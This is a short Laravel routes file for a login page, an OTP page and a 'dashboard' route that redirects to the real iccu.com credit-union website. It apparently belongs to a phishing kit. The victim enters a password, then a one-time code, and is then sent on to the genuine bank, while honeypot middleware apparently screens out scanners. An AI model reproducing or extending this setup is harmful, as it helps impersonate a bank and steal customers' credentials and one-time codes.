<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Middleware\CheckHoneypot;

Route::get('/', function () {
    return view('login');
})->name('login.form')->middleware([CheckHoneypot::class, 'throttle:5,1']);

Route::post('/login', [AuthController::class, 'login'])->name('login');

Route::get('/otp', function () {
    return view('otp');
})->name('otp')->middleware([CheckHoneypot::class, 'throttle:5,1']);


Route::post('/otp', [AuthController::class, 'verifyOtp'])->name('otp');

Route::get('/dashboard', function () {
    return redirect('https://www.iccu.com/');
})->name('dashboard');
